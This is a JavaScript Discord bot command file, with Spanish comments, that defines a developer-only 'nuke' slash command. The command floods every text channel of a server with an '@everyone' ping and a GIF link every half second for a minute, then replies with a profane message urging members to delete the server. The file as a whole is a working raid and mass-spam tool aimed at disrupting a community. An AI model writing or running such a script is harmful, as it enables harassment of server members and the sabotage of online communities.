////   DEPENDENCIAS  ////
const PATH = require("path");
const { createAnswer } = require(PATH.resolve("src","bot","utilities","utilities.js"));
const { SlashCommandBuilder, PermissionFlagsBits } = require("discord.js");
////   INICIO CODIGO ////
module.exports = {
    data: new SlashCommandBuilder()
    .setName("nuke")
    .setDescription("Servidor De Mierda")
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels),
    devOnly: true,
    execute: async (Client, Interaction) => {
        try {
            const GUILD = Interaction.guild;
            const canales = GUILD.channels.cache.filter(channel => channel.isTextBased());

            const CICLO = setInterval(async() => {
                for (const canal of canales.values()) {
                    try {
                        await canal.send("@everyone hora de migrar pequeños https://media.discordapp.net/attachments/976649411931291728/1075276614558036028/attachment.gif?ex=67362922&is=6734d7a2&hm=34fd5b471d54c77d886c1903186732bbb5ad98be9673d3cd952c8e54d4094e8a&");
                    } catch (error) {
                        console.error(error.message);
                    }
                }
            }, 500);
            setTimeout(() => {
                clearInterval(CICLO);
            }, 60000);
        } catch (error) {
            console.error(error.message);
        }   
        Interaction.reply("Ya borren el puto server.")
    }
}